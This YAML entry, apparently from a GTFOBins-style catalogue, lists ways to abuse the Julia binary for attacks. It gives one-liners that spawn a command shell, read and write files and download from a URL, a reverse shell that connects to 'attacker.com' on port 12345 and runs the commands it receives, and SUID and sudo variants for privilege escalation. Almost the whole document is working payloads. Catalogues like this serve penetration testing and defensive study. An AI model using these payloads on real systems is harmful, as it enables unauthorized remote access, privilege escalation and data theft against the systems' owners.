---
description: |
All payloads are compatible with the Base packages from Julia.
functions:
  shell:
    - description: The `run()` function runs every command passed as parameter with what is defined in `$JULIA_SHELL`. Defaults to the environment variable `$SHELL`, and falls back to `/bin/sh` if `$SHELL` is unset.
    - code: julia -e 'while true; c = split(readline()); run(`$c`); end;'
  file-read:
    - code: julia -e 'println(open(f->read(f, String), "file_to_read"))'
  file-write:
    - code: julia -e 'open(f->write(f, "DATA"), "file_to_write", "w")'
  file-download:
    - code: julia -e 'download("URL", "PATH")'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        julia -e 'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
  suid:
    - code: julia -e 'while true; c = split(readline()); run(`$c`); end;'
  sudo:
    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
    - code: sudo julia -e 'while true; c = split(readline()); run(`$c`); end;'
---
